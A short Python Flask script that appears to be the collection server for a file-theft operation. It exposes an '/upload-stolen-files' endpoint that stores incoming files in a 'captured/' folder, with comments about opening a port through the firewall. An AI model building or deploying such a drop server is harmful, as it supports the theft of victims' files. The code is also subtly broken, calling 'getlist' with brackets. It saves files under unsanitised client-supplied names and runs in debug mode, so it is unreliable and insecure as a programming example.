from flask import Flask, flash, request, jsonify
import os

# Initialise Flask app
app = Flask(__name__)

# Folder to upload in windows
UPLOAD_FOLDER = 'captured/'
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

@app.route('/upload-stolen-files', methods=['POST'])
def upload_file():
    # Check if POST request has the file part
    if 'files[]' not in request.files:
        flash('No file part')
        return jsonify({'error': 'No file part'}), 400
    
    files = request.files.getlist['files[]']
    if not files:
        flash('No selected files')
        return jsonify({'error': 'No selected files (n)'}), 400

    for file in files:
        if file.filename == '':
            return jsonify({'error': 'No selected file (1)'}), 400
        file.save(os.path.join(UPLOAD_FOLDER, file.filename))
    return jsonify({'success': 'Files uploaded successfully'}), 200

if __name__ == '__main__':
    # Debugging
    app.run(debug=True)

#Specify port
#Allow port through firewall